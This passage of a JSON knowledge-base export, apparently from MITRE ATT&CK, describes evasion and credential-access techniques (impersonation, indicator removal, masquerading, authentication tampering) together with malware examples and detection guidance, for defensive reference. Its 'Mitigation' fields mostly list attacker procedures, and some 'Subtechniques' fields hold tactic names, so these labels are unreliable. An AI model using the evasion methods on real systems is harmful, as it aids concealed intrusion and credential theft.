    "Description": "Adversaries may impersonate a trusted person or organization in order to persuade and trick a target into performing some action on their behalf. For example, adversaries may communicate with victims (via Phishing for Information, Phishing, or Internal Spearphishing) while impersonating a known sender such as an executive, colleague, or third-party vendor. Established trust can then be leveraged to accomplish an adversary’s ultimate goals, possibly against multiple victims. In many cases of business email compromise or email fraud campaigns, adversaries use impersonation to defraud victims -- deceiving them into sending money or divulging information that ultimately enables Financial Theft.Adversaries will often also use social engineering techniques such as manipulative and persuasive language in email subject lines and body text such as payment, request, or urgent to push the victim to act quickly before malicious activity is detected. These campaigns are often specifically targeted against people who, due to job roles and/or accesses, can carry out the adversary’s goal.   Impersonation is typically preceded by reconnaissance techniques such as Gather Victim Identity Information and Gather Victim Org Information as well as acquiring infrastructure such as email domains (i.e. Domains) to substantiate their false identity.[1]There is the potential for multiple victims in campaigns involving impersonation. For example, an adversary may Compromise Accounts targeting one organization which can then be used to support impersonation against other entities.[2]",
    "Mitigation": [
      {
        "id": "C0027",
        "name": "C0027",
        "description": "During C0027, Scattered Spider impersonated legitimate IT personnel in phone calls and text messages either to direct victims to a credential harvesting site or getting victims to run commercial remote monitoring and management (RMM) tools.[3]"
      },
      {
        "id": "G1004",
        "name": "LAPSUS$",
        "description": "LAPSUS$ has called victims' help desk and impersonated legitimate users with previously gathered information in order to gain access to privileged accounts.[4]"
      },
      {
        "id": "C0022",
        "name": "Operation Dream Job",
        "description": "During Operation Dream Job, Lazarus Group impersonated HR hiring personnel through LinkedIn messages and conducted interviews with victims in order to deceive them into downloading malware.[5][6][7]"
      }
    ],
    "Detection": [
      {
        "id": "DS0015",
        "dsource": "Application Log",
        "dcomp": "Application Log Content",
        "detects": "Review and monitor email and other user communication logs for signs of impersonation, such as suspicious emails (e.g., from known malicious or compromised accounts) or content associated with an adversary's actions on objective (e.g., abnormal monetary transactions)."
      }
    ],
    "Subtechniques": "\nDefense Evasion"
  },
  {
    "Title": "Indicator Removal",
    "Code": "T1070",
    "Description": "Adversaries may delete or modify artifacts generated within systems to remove evidence of their presence or hinder defenses. Various artifacts may be created by an adversary or something that can be attributed to an adversary’s actions. Typically these artifacts are used as defensive indicators related to monitored events, such as strings from downloaded files, logs that are generated from user actions, and other data analyzed by defenders. Location, format, and type of artifact (such as command or login history) are often specific to each platform.Removal of these indicators may interfere with event collection, reporting, or other processes used to detect intrusion activity. This may compromise the integrity of security solutions by causing notable events to go unreported. This activity may also impede forensic analysis and incident response, due to lack of sufficient data to determine what occurred.",
    "Mitigation": [
      {
        "id": "S0239",
        "name": "Bankshot",
        "description": "Bankshot deletes all artifacts associated with the malware from the infected machine.[1]"
      },
      {
        "id": "S0089",
        "name": "BlackEnergy",
        "description": "BlackEnergy has removed the watermark associated with enabling the TESTSIGNING boot configuration option by removing the relevant strings in the user32.dll.mui of the system.[2]"
      },
      {
        "id": "S0527",
        "name": "CSPY Downloader",
        "description": "CSPY Downloader has the ability to remove values it writes to the Registry.[3]"
      },
      {
        "id": "S0673",
        "name": "DarkWatchman",
        "description": "DarkWatchman can uninstall malicious components from the Registry, stop processes, and clear the browser history.[4]"
      },
      {
        "id": "S0695",
        "name": "Donut",
        "description": "Donut can erase file references to payloads in-memory after being reflectively loaded and executed.[5]"
      },
      {
        "id": "S0568",
        "name": "EVILNUM",
        "description": "EVILNUM has a function called \"DeleteLeftovers\" to remove certain artifacts of the attack.[6]"
      },
      {
        "id": "S0696",
        "name": "Flagpro",
        "description": "Flagpro can close specific Windows Security and Internet Explorer dialog boxes to mask external connections.[7]"
      },
      {
        "id": "S1044",
        "name": "FunnyDream",
        "description": "FunnyDream has the ability to clean traces of malware deployment.[8]"
      },
      {
        "id": "S0697",
        "name": "HermeticWiper",
        "description": "HermeticWiper can disable pop-up information about folders and desktop items and delete Registry keys to hide malicious services.[9][10]"
      },
      {
        "id": "G0032",
        "name": "Lazarus Group",
        "description": "Lazarus Group has restored malicious KernelCallbackTable code to its original state after the process execution flow has been hijacked.[11]"
      },
      {
        "id": "S0449",
        "name": "Maze",
        "description": "Maze has used the \"Wow64RevertWow64FsRedirection\" function following attempts to delete the shadow volumes, in order to leave the system in the same state as it was prior to redirection.[12]"
      },
      {
        "id": "S0455",
        "name": "Metamorfo",
        "description": "Metamorfo has a command to delete a Registry key it uses, \\Software\\Microsoft\\Internet Explorer\\notes.[13]"
      },
      {
        "id": "S0691",
        "name": "Neoichor",
        "description": "Neoichor can clear the browser history on a compromised host by changing the ClearBrowsingHistoryOnExit value to 1 in the HKEY_CURRENT_USER\\Software\\Microsoft\\Internet Explorer\\Privacy Registry key.[14]"
      },
      {
        "id": "S0229",
        "name": "Orz",
        "description": "Orz can overwrite Registry settings to reduce its visibility on the victim.[15]"
      },
      {
        "id": "S0448",
        "name": "Rising Sun",
        "description": "Rising Sun can clear a memory blog in the process by overwriting it with junk bytes.[16]"
      },
      {
        "id": "S1085",
        "name": "Sardonic",
        "description": "Sardonic has the ability to delete created WMI objects to evade detections.[17]"
      },
      {
        "id": "S0461",
        "name": "SDBbot",
        "description": "SDBbot has the ability to clean up and remove data structures from a compromised host.[18]"
      },
      {
        "id": "S0596",
        "name": "ShadowPad",
        "description": "ShadowPad has deleted arbitrary Registry values.[19]"
      },
      {
        "id": "S0589",
        "name": "Sibot",
        "description": "Sibot will delete an associated registry key if a certain server response is received.[20]"
      },
      {
        "id": "S0692",
        "name": "SILENTTRINITY",
        "description": "SILENTTRINITY can remove artifacts from the compromised host, including created Registry keys.[21]"
      },
      {
        "id": "C0024",
        "name": "SolarWinds Compromise",
        "description": "During the SolarWinds Compromise, APT29 temporarily replaced legitimate utilities with their own, executed their payload, and then restored the original file.[22]"
      },
      {
        "id": "S0603",
        "name": "Stuxnet",
        "description": "Stuxnet can delete OLE Automation and SQL stored procedures used to store malicious payloads.[23]"
      },
      {
        "id": "S0559",
        "name": "SUNBURST",
        "description": "SUNBURST removed HTTP proxy registry values to clean up traces of execution.[24]"
      }
    ],
    "Detection": [
      {
        "id": "DS0015",
        "dsource": "Application Log",
        "dcomp": "Application Log Content",
        "detects": "Monitor logs for abnormal modifications to application settings, such as the creation of malicious Exchange transport rules."
      },
      {
        "id": "DS0017",
        "dsource": "Command",
        "dcomp": "Command Execution",
        "detects": "Monitor executed commands and arguments that may delete or alter generated artifacts on a host system, including logs or captured files such as quarantined malware."
      },
      {
        "id": "DS0022",
        "dsource": "File",
        "dcomp": "File Deletion",
        "detects": "Monitor for a file that may delete or alter generated artifacts on a host system, including logs or captured files such as quarantined malware."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "File Metadata",
        "detects": "Monitor for contextual file data that may show signs of deletion or alter generated artifacts on a host system, including logs or captured files such as quarantined malware."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "File Modification",
        "detects": "Monitor for changes made to a file may delete or alter generated artifacts on a host system, including logs or captured files such as quarantined malware."
      },
      {
        "id": "DS0018",
        "dsource": "Firewall",
        "dcomp": "Firewall Rule Modification",
        "detects": "Monitor for changes made to firewall rules, especially unexpected modifications that may potentially be related to allowing and/or cleaning up previous tampering that enabled malicious network traffic."
      },
      {
        "id": "DS0029",
        "dsource": "Network Traffic",
        "dcomp": "Network Traffic Content",
        "detects": "Monitor and analyze traffic patterns and packet inspection associated to protocol(s) that do not follow the expected protocol standards and traffic flows (e.g extraneous packets that do not belong to established flows, gratuitous or anomalous traffic patterns, anomalous syntax, or structure). Consider correlation with process monitoring and command line to detect anomalous processes execution and command line arguments associated to traffic patterns (e.g. monitor anomalies in use of files that do not normally initiate connections for respective protocol(s))."
      },
      {
        "id": "DS0009",
        "dsource": "Process",
        "dcomp": "OS API Execution",
        "detects": "Monitor for API calls that may delete or alter generated artifacts on a host system, including logs or captured files such as quarantined malware."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Process Creation",
        "detects": "Monitor for newly executed processes that may delete or alter generated artifacts on a host system, including logs or captured files such as quarantined malware."
      },
      {
        "id": "DS0003",
        "dsource": "Scheduled Job",
        "dcomp": "Scheduled Job Modification",
        "detects": "Monitor for changes made to scheduled jobs that may attempt to remove artifacts on a host system."
      },
      {
        "id": "DS0002",
        "dsource": "User Account",
        "dcomp": "User Account Authentication",
        "detects": "Monitor for an attempt by a user to gain access to a network or computing resource, often by providing credentials that may delete or alter generated artifacts on a host system, including logs or captured files such as quarantined malware."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "User Account Deletion",
        "detects": "Monitor for unexpected deletions of user accounts. Windows event logs may highlight activity associated with an adversary's attempt to remove an account (e.g., Event ID 4726 - A user account was deleted).Alerting on these Event IDs may generate a high degree of false positives, so compare against baseline knowledge for how systems are typically used and correlate account modification events with other indications of malicious activity where possible."
      },
      {
        "id": "DS0024",
        "dsource": "Windows Registry",
        "dcomp": "Windows Registry Key Deletion",
        "detects": "Monitor windows registry keys that may be deleted or alter generated artifacts on a host system, including logs or captured files such as quarantined malware."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Windows Registry Key Modification",
        "detects": "Monitor for changes made to windows registry keys or values that may delete or alter generated artifacts on a host system, including logs or captured files such as quarantined malware."
      }
    ],
    "Subtechniques": [
      {
        "id": "T1070.001",
        "name": "Clear Windows Event Logs"
      },
      {
        "id": "T1070.002",
        "name": "Clear Linux or Mac System Logs"
      },
      {
        "id": "T1070.003",
        "name": "Clear Command History"
      },
      {
        "id": "T1070.004",
        "name": "File Deletion"
      },
      {
        "id": "T1070.005",
        "name": "Network Share Connection Removal"
      },
      {
        "id": "T1070.006",
        "name": "Timestomp"
      },
      {
        "id": "T1070.007",
        "name": "Clear Network Connection History and Configurations"
      },
      {
        "id": "T1070.008",
        "name": "Clear Mailbox Data"
      },
      {
        "id": "T1070.009",
        "name": "Clear Persistence"
      }
    ],
    "Tactic": "\nDefense Evasion"
  },
  {
    "Title": "Indirect Command Execution",
    "Code": "T1202",
    "Description": "Adversaries may abuse utilities that allow for command execution to bypass security restrictions that limit the use of command-line interpreters. Various Windows utilities may be used to execute commands, possibly without invoking cmd. For example, Forfiles, the Program Compatibility Assistant (pcalua.exe), components of the Windows Subsystem for Linux (WSL), as well as other utilities may invoke the execution of programs and commands from a Command and Scripting Interpreter, Run window, or via scripts. [1] [2]Adversaries may abuse these features for Defense Evasion, specifically to perform arbitrary execution while subverting detections and/or mitigation controls (such as Group Policy) that limit/prevent the usage of cmd or file extensions more commonly associated with malicious payloads.",
    "Mitigation": [
      {
        "id": "S0193",
        "name": "Forfiles",
        "description": "Forfiles can be used to subvert controls and possibly conceal command execution by not directly invoking cmd.[1][2]"
      },
      {
        "id": "G0032",
        "name": "Lazarus Group",
        "description": "Lazarus Group persistence mechanisms have used forfiles.exe to execute .htm files.[3]"
      },
      {
        "id": "S0379",
        "name": "Revenge RAT",
        "description": "Revenge RAT uses the Forfiles utility to execute commands on the system.[4]"
      }
    ],
    "Detection": [
      {
        "id": "DS0017",
        "dsource": "Command",
        "dcomp": "Command Execution",
        "detects": "Monitor executed commands and arguments to bypass security restrictions that limit the use of command-line interpreters."
      },
      {
        "id": "DS0009",
        "dsource": "Process",
        "dcomp": "Process Creation",
        "detects": "Monitor for newly constructed processes and/or command-lines that can be used instead of invoking cmd (i.e. pcalua.exe, winrs.exe, cscript/wscript.exe, hh.exe, or bash.exe)"
      }
    ],
    "Subtechniques": "\nDefense Evasion"
  },
  {
    "Title": "Masquerading",
    "Code": "T1036",
    "Description": "Adversaries may attempt to manipulate features of their artifacts to make them appear legitimate or benign to users and/or security tools. Masquerading occurs when the name or location of an object, legitimate or malicious, is manipulated or abused for the sake of evading defenses and observation. This may include manipulating file metadata, tricking users into misidentifying the file type, and giving legitimate task or service names.Renaming abusable system utilities to evade security monitoring is also a form of Masquerading.[1] Masquerading may also include the use of Proxy or VPNs to disguise IP addresses, which can allow adversaries to blend in with normal network traffic and bypass conditional access policies or anti-abuse protections.",
    "Mitigation": [
      {
        "id": "S0622",
        "name": "AppleSeed",
        "description": "AppleSeed can disguise JavaScript files as PDFs.[2]"
      },
      {
        "id": "G0007",
        "name": "APT28",
        "description": "APT28 has renamed the WinRAR utility to avoid detection.[3]"
      },
      {
        "id": "G0050",
        "name": "APT32",
        "description": "APT32 has disguised a Cobalt Strike beacon as a Flash Installer.[4]"
      },
      {
        "id": "S0268",
        "name": "Bisonal",
        "description": "Bisonal dropped a decoy payload with a .jpg extension that contained a malicious Visual Basic script.[5]"
      },
      {
        "id": "S0635",
        "name": "BoomBox",
        "description": "BoomBox has the ability to mask malicious data strings as PDF files.[6]"
      },
      {
        "id": "G0060",
        "name": "BRONZE BUTLER",
        "description": "BRONZE BUTLER has masked executables with document file icons including Word and Adobe PDF.[7]"
      },
      {
        "id": "C0015",
        "name": "C0015",
        "description": "During C0015, the threat actors named a binary file compareForfor.jpg to disguise it as a JPG file.[8]"
      },
      {
        "id": "C0018",
        "name": "C0018",
        "description": "During C0018, AvosLocker was disguised using the victim company name as the filename.[9]"
      },
      {
        "id": "S0497",
        "name": "Dacls",
        "description": "The Dacls Mach-O binary has been disguised as a .nib file.[10]"
      },
      {
        "id": "S1066",
        "name": "DarkTortilla",
        "description": "DarkTortilla's payload has been renamed PowerShellInfo.exe.[11]"
      },
      {
        "id": "S0673",
        "name": "DarkWatchman",
        "description": "DarkWatchman has used an icon mimicking a text file to mask a malicious executable.[12]"
      },
      {
        "id": "G0035",
        "name": "Dragonfly",
        "description": "Dragonfly has created accounts disguised as legitimate backup and service accounts as well as an email administration account.[13]"
      },
      {
        "id": "S0634",
        "name": "EnvyScout",
        "description": "EnvyScout has used folder icons for malicious files to lure victims into opening them.[6]"
      },
      {
        "id": "S0512",
        "name": "FatDuke",
        "description": "FatDuke has attempted to mimic a compromised user's traffic by using the same user agent as the installed browser.[14]"
      },
      {
        "id": "G1016",
        "name": "FIN13",
        "description": "FIN13 has masqueraded staged data by using the Windows certutil utility to generate fake Base64 encoded certificates with the input file.[15][16]"
      },
      {
        "id": "S0696",
        "name": "Flagpro",
        "description": "Flagpro can download malicious files with a .tmp extension and append them with .exe prior to execution.[17]"
      },
      {
        "id": "S0661",
        "name": "FoggyWeb",
        "description": "FoggyWeb can masquerade the output of C2 commands as a fake, but legitimately formatted WebP file.[18]"
      },
      {
        "id": "G0094",
        "name": "Kimsuky",
        "description": "Kimsuky has disguised its C2 addresses as the websites of shopping malls, governments, universities, and others.[19]"
      },
      {
        "id": "G0140",
        "name": "LazyScripter",
        "description": "LazyScripter has used several different security software icons to disguise executables.[20]"
      },
      {
        "id": "G0045",
        "name": "menuPass",
        "description": "menuPass has used esentutl to change file extensions to their true type that were masquerading as .txt files.[21]"
      },
      {
        "id": "S1015",
        "name": "Milan",
        "description": "Milan has used an executable named companycatalogue to appear benign.[22]"
      },
      {
        "id": "S0637",
        "name": "NativeZone",
        "description": "NativeZone has, upon execution, displayed a message box that appears to be related to a Ukrainian electronic document management system.[23]"
      },
      {
        "id": "G0133",
        "name": "Nomadic Octopus",
        "description": "Nomadic Octopus attempted to make Octopus appear as a  Telegram Messenger with a Russian interface.[24]"
      },
      {
        "id": "S0368",
        "name": "NotPetya",
        "description": "NotPetya drops PsExec with the filename dllhost.dat.[25]"
      },
      {
        "id": "G0049",
        "name": "OilRig",
        "description": "OilRig has used .doc file extensions to mask malicious executables.[26]"
      },
      {
        "id": "C0016",
        "name": "Operation Dust Storm",
        "description": "For Operation Dust Storm, the threat actors disguised some executables as JPG files.[27]"
      },
      {
        "id": "C0006",
        "name": "Operation Honeybee",
        "description": "During Operation Honeybee, the threat actors modified the MaoCheng dropper so its icon appeared as a Word document.[28]"
      },
      {
        "id": "G0068",
        "name": "PLATINUM",
        "description": "PLATINUM has renamed rar.exe to avoid detection.[29]"
      },
      {
        "id": "S1046",
        "name": "PowGoop",
        "description": "PowGoop has disguised a PowerShell script as a .dat file (goopdate.dat).[30]"
      },
      {
        "id": "S0565",
        "name": "Raindrop",
        "description": "Raindrop was built to include a modified version of 7-Zip source code (including associated export names) and Far Manager source code.[31][32]"
      },
      {
        "id": "S0458",
        "name": "Ramsay",
        "description": "Ramsay has masqueraded as a JPG image file.[33]"
      },
      {
        "id": "S0662",
        "name": "RCSession",
        "description": "RCSession has used a file named English.rtf to appear benign on victim hosts.[34][35]"
      },
      {
        "id": "S0148",
        "name": "RTM",
        "description": "RTM has been delivered as archived Windows executable files masquerading as PDF documents.[36]"
      },
      {
        "id": "S0446",
        "name": "Ryuk",
        "description": "Ryuk can create .dll files that actually contain a Rich Text File format document.[37]"
      },
      {
        "id": "S1018",
        "name": "Saint Bot",
        "description": "Saint Bot has renamed malicious binaries as wallpaper.mp4 and slideshow.mp4 to avoid detection.[38][39]"
      },
      {
        "id": "C0024",
        "name": "SolarWinds Compromise",
        "description": "During the SolarWinds Compromise, APT29 set the hostnames of their C2 infrastructure to match legitimate hostnames in the victim environment. They also used IP addresses originating from the same country as the victim for their VPN infrastructure.[40]"
      },
      {
        "id": "S0615",
        "name": "SombRAT",
        "description": "SombRAT can use a legitimate process name to hide itself.[41]"
      },
      {
        "id": "G0127",
        "name": "TA551",
        "description": "TA551 has masked malware DLLs as dat and jpg files.[42]"
      },
      {
        "id": "G0139",
        "name": "TeamTNT",
        "description": "TeamTNT has disguised their scripts with docker-related file names.[43]"
      },
      {
        "id": "S0682",
        "name": "TrailBlazer",
        "description": "TrailBlazer has used filenames that match the name of the compromised system in attempt to avoid detection.[44]"
      },
      {
        "id": "S0266",
        "name": "TrickBot",
        "description": "The TrickBot downloader has used an icon to appear as a Microsoft Word document.[45]"
      },
      {
        "id": "S0689",
        "name": "WhisperGate",
        "description": "WhisperGate has been disguised as a JPG extension to avoid detection as a malicious PE file.[46]"
      },
      {
        "id": "G0112",
        "name": "Windshift",
        "description": "Windshift has used icons mimicking MS Office files to mask malicious executables.[47] Windshift has also attempted to hide executables by changing the file extension to \".scr\" to mimic Windows screensavers.[48]"
      },
      {
        "id": "S0466",
        "name": "WindTail",
        "description": "WindTail has used icons mimicking MS Office files to mask payloads.[47]"
      },
      {
        "id": "S0658",
        "name": "XCSSET",
        "description": "XCSSET builds a malicious application bundle to resemble Safari through using the Safari icon and Info.plist. [49]"
      },
      {
        "id": "G0128",
        "name": "ZIRCONIUM",
        "description": "ZIRCONIUM has spoofed legitimate applications in phishing lures and changed file extensions to conceal  installation of malware.[50][51]"
      }
    ],
    "Detection": [
      {
        "id": "DS0017",
        "dsource": "Command",
        "dcomp": "Command Execution",
        "detects": "Monitor executed commands and arguments that may attempt to manipulate features of their artifacts to make them appear legitimate or benign to users and/or security tools. [52]Note: For Windows, Event ID 4104 (from the Microsoft-Windows-Powershell/Operational log) captures Powershell script blocks, which can be analyzed and used to detect on potential Masquerading."
      },
      {
        "id": "DS0022",
        "dsource": "File",
        "dcomp": "File Metadata",
        "detects": "Collect file hashes; file names that do not match their expected hash are suspect. Perform file monitoring; files with known names but in unusual locations are suspect. Look for indications of common characters that may indicate an attempt to trick users into misidentifying the file type, such as a space as the last character of a file name or the right-to-left override characters\"\\u202E\", \"[U+202E]\", and \"%E2%80%AE\".Check and ensure that file headers/signature and extensions match using magic bytes detection and/or file signature validation.[53] In Linux, the file command may be used to check the file signature.[54]"
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "File Modification",
        "detects": "Monitor for changes made to files outside of an update or patch that may attempt to manipulate features of their artifacts to make them appear legitimate or benign to users and/or security tools. Windows Event ID 4663 (An Attempt Was Made to Access An Object) can be used to alert on attempted file accesses that may be associate with Masquerading."
      },
      {
        "id": "DS0007",
        "dsource": "Image",
        "dcomp": "Image Metadata",
        "detects": "Collecting disk and resource filenames for binaries, comparing that the InternalName, OriginalFilename, and/or ProductName match what is expected, could provide useful leads but may not always be indicative of malicious activity. [55]"
      },
      {
        "id": "DS0009",
        "dsource": "Process",
        "dcomp": "OS API Execution",
        "detects": "Monitor for API calls such as fork() which can be abused to masquerade or manipulate process metadata."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Process Creation",
        "detects": "Monitor for newly executed processes that may attempt to manipulate features of their artifacts to make them appear legitimate or benign to users and/or security tools. The RECYCLER and SystemVolumeInformation directories will be present on every drive. Replace %systemroot% and %windir% with the actual paths as configured by the endpoints.Analytic 1 - Suspicious Run Locations suspicious_locations = filter process where ( image_path == \":\\RECYCLER*\" or image_path == \":\\SystemVolumeInformation*\" or image_path == \"%windir%\\Tasks*\" or image_path == \"%systemroot%\\debug*\")"
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Process Metadata",
        "detects": "Monitor for file names that are mismatched between the file name on disk and that of the binary's PE metadata, this is a likely indicator that a binary was renamed after it was compiled."
      },
      {
        "id": "DS0003",
        "dsource": "Scheduled Job",
        "dcomp": "Scheduled Job Metadata",
        "detects": "Monitor for contextual data about a scheduled job, which may include information such as name, timing, command(s), etc.On Windows, Event ID 4698 (Security Log - A scheduled task was created) can be used to alert on the creation of scheduled tasks and provides metadata including the task name and task content (as XML).On Linux, auditing frameworks such as the Linux Auditing System (auditd) can be used to alert on invocations of cron, and provides the metadata included when executing the command."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Scheduled Job Modification",
        "detects": "Monitor for changes made to scheduled jobs that may attempt to manipulate features of their artifacts to make them appear legitimate or benign to users and/or security tools."
      },
      {
        "id": "DS0019",
        "dsource": "Service",
        "dcomp": "Service Creation",
        "detects": "Monitor for newly constructed services/daemons that may attempt to manipulate features of their artifacts to make them appear legitimate or benign to users and/or security tools."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Service Metadata",
        "detects": "Monitor for contextual data about a service/daemon, which may include information such as name, service executable, start type, etc."
      }
    ],
    "Subtechniques": [
      {
        "id": "T1036.001",
        "name": "Invalid Code Signature"
      },
      {
        "id": "T1036.002",
        "name": "Right-to-Left Override"
      },
      {
        "id": "T1036.003",
        "name": "Rename System Utilities"
      },
      {
        "id": "T1036.004",
        "name": "Masquerade Task or Service"
      },
      {
        "id": "T1036.005",
        "name": "Match Legitimate Name or Location"
      },
      {
        "id": "T1036.006",
        "name": "Space after Filename"
      },
      {
        "id": "T1036.007",
        "name": "Double File Extension"
      },
      {
        "id": "T1036.008",
        "name": "Masquerade File Type"
      },
      {
        "id": "T1036.009",
        "name": "Break Process Trees"
      }
    ],
    "Tactic": "\nDefense Evasion"
  },
  {
    "Title": "Modify Authentication Process",
    "Code": "T1556",
    "Description": "Adversaries may modify authentication mechanisms and processes to access user credentials or enable otherwise unwarranted access to accounts. The authentication process is handled by mechanisms, such as the Local Security Authentication Server (LSASS) process and the Security Accounts Manager (SAM) on Windows, pluggable authentication modules (PAM) on Unix-based systems, and authorization plugins on MacOS systems, responsible for gathering, storing, and validating credentials. By modifying an authentication process, an adversary may be able to authenticate to a service or system without using Valid Accounts.Adversaries may maliciously modify a part of this process to either reveal credentials or bypass authentication mechanisms. Compromised credentials or access may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access and remote desktop.",
    "Mitigation": [
      {
        "id": "S0377",
        "name": "Ebury",
        "description": "Ebury can intercept private keys using a trojanized ssh-add function.[1]"
      },
      {
        "id": "G1016",
        "name": "FIN13",
        "description": "FIN13 has replaced legitimate KeePass binaries with trojanized versions to collect passwords from numerous applications.[2]"
      },
      {
        "id": "S0487",
        "name": "Kessel",
        "description": "Kessel has trojanized the ssh_login and user-auth_pubkey functions to steal plaintext credentials.[3]"
      },
      {
        "id": "S0692",
        "name": "SILENTTRINITY",
        "description": "SILENTTRINITY can create a backdoor in KeePass using a malicious config file and in TortoiseSVN using a registry hook.[4]"
      }
    ],
    "Detection": [
      {
        "id": "DS0026",
        "dsource": "Active Directory",
        "dcomp": "Active Directory Object Modification",
        "detects": "Monitor for changes made to AD security settings related to MFA logon requirements, such as changes to Azure AD Conditional Access Policies or the registration of new MFA applications."
      },
      {
        "id": "DS0015",
        "dsource": "Application Log",
        "dcomp": "Application Log Content",
        "detects": "Enable security auditing to collect logs from hybrid identity solutions. For example, monitor sign-ins to the Azure AD Application Proxy Connector, which are typically generated only when a new Pass Through Authentication (PTA) Agent is added. [5] If AD FS is in use, review the logs for event ID 501, which specifies all EKU attributes on a claim, and raise alerts on any values that are not configured in your environment.[6]"
      },
      {
        "id": "DS0022",
        "dsource": "File",
        "dcomp": "File Creation",
        "detects": "Monitor for suspicious additions to the /Library/Security/SecurityAgentPlugins directory.[13]Monitor for newly created files that may be used to register malicious network provider dynamic link libraries (DLLs)."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "File Modification",
        "detects": "Monitor for suspicious modification of files associated with authentication processes, such as configuration files and module paths (e.g. /etc/pam.d/). Use system-integrity tools such as AIDE and monitoring tools such as auditd to monitor PAM files. Also monitor for access to certificates and cryptographic keys material."
      },
      {
        "id": "DS0028",
        "dsource": "Logon Session",
        "dcomp": "Logon Session Creation",
        "detects": "Monitor for newly constructed logon behavior across systems that share accounts, either user, admin, or service accounts. Examples: one account logged into multiple systems simultaneously; multiple accounts logged into the same machine simultaneously; accounts logged in at odd times (ex: when the user is not present) or outside of business hours. Activity may be from interactive login sessions or process ownership from accounts being used to execute binaries on a remote system as a particular account. Correlate other security systems with login information (e.g., a user has an active login session but has not entered the building or does not have VPN access). Configure robust, consistent account activity audit policies across the enterprise and with externally accessible services.[14]"
      },
      {
        "id": "DS0011",
        "dsource": "Module",
        "dcomp": "Module Load",
        "detects": "Monitor for new, unfamiliar DLL files written to a domain controller and/or local computer. Password filters will also show up as an autorun and loaded DLL in lsass.exe.[15] If AD FS is in use, monitor the AD FS server for the creation of DLLs as well as the loading of unrecognized or unsigned DLLs into the Microsoft.IdentityServer.Servicehost application.[6]"
      },
      {
        "id": "DS0009",
        "dsource": "Process",
        "dcomp": "OS API Execution",
        "detects": "Monitor for calls to OpenProcess that can be used to manipulate lsass.exe running on a domain controller as well as for malicious modifications to functions exported from authentication-related system DLLs (such as cryptdll.dll and samsrv.dll).[16]Monitor for abnormal API calls to NPLogonNotify() that may highlight malicious network provider DLLs.[17]"
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Process Access",
        "detects": "Monitor for unexpected processes interacting with authentication mechanisms and processes to access user credentials or enable otherwise unwarranted access to accounts."
      },
      {
        "id": "DS0002",
        "dsource": "User Account",
        "dcomp": "User Account Authentication",
        "detects": "Monitor for account authentications in which MFA credentials are not provided by the user account to the authenticating entity."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "User Account Modification",
        "detects": "Monitor for the enrollment of devices and user accounts with alternative security settings that do not require MFA credentials for successful logon."
      },
      {
        "id": "DS0024",
        "dsource": "Windows Registry",
        "dcomp": "Windows Registry Key Creation",
        "detects": "Monitor for the addition of network provider Registry keys (e.g., HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\<NetworkProviderName>\\NetworkProvider)."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Windows Registry Key Modification",
        "detects": "Monitor for changes to Registry entries for password filters (ex: HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Notification Packages) and correlate then investigate the DLL files these files reference.Monitor for changes to Registry entries for network providers (e.g., HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\NetworkProvider\\Order) and correlate then investigate the DLL files these values reference."
      }
    ],
    "Subtechniques": [
      {
        "id": "T1556.001",
        "name": "Domain Controller Authentication"
      },
      {
        "id": "T1556.002",
        "name": "Password Filter DLL"
      },
      {
        "id": "T1556.003",
        "name": "Pluggable Authentication Modules"
      },
      {
        "id": "T1556.004",
        "name": "Network Device Authentication"
      },
      {
        "id": "T1556.005",
        "name": "Reversible Encryption"
      },
      {
        "id": "T1556.006",
        "name": "Multi-Factor Authentication"
      },
      {
        "id": "T1556.007",
        "name": "Hybrid Identity"
      },
      {
        "id": "T1556.008",
        "name": "Network Provider DLL"
      }
    ],
    "Tactic": "CredentialAccess, DefenseEvasion, Persistence"
  },
  {
    "Title": "Modify Cloud Compute Infrastructure",
    "Code": "T1578",
    "Description": "An adversary may attempt to modify a cloud account's compute service infrastructure to evade defenses. A modification to the compute service infrastructure can include the creation, deletion, or modification of one or more components such as compute instances, virtual machines, and snapshots.Permissions gained from the modification of infrastructure components may bypass restrictions that prevent access to existing infrastructure. Modifying infrastructure components may also allow an adversary to evade detection and remove evidence of their presence.[1]",
    "Mitigation": [
      {
        "id": "M1047",
        "name": "Audit",
        "description": "Routinely monitor user permissions to ensure only the expected users have the capability to modify cloud compute infrastructure components."
      },
      {
        "id": "M1018",
        "name": "User Account Management",
        "description": "Limit permissions for creating, deleting, and otherwise altering compute components in accordance with least privilege. Organizations should limit the number of users within the organization with an IAM role that has administrative privileges, strive to reduce all permanent privileged role assignments, and conduct periodic entitlement reviews on IAM users, roles and policies.[1]"
      }
    ],
    "Detection": [
      {
        "id": "DS0025",
        "dsource": "Cloud Service",
        "dcomp": "Cloud Service Metadata",
        "detects": "Monitor for quota increases across all regions, especially multiple quota increases in a short period of time or quota increases in unused regions. Monitor for changes to tenant-level settings such as subscriptions and enabled regions.[2]"
      },
      {
        "id": "DS0030",
        "dsource": "Instance",
        "dcomp": "Instance Creation",
        "detects": "The creation of a new instance or VM is a common part of operations within many cloud environments. Events should then not be viewed in isolation, but as part of a chain of behavior that could lead to other activities. For example, the creation of an instance by a new user account or the unexpected creation of one or more snapshots followed by the creation of an instance may indicate suspicious activity.In AWS, CloudTrail logs capture the creation of an instance in the RunInstances event, and in Azure the creation of a VM may be captured in Azure activity logs.[3] [4] Google's Admin Activity audit logs within their Cloud Audit logs can be used to detect the usage of gcloud compute instances create to create a VM.[5]"
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Instance Deletion",
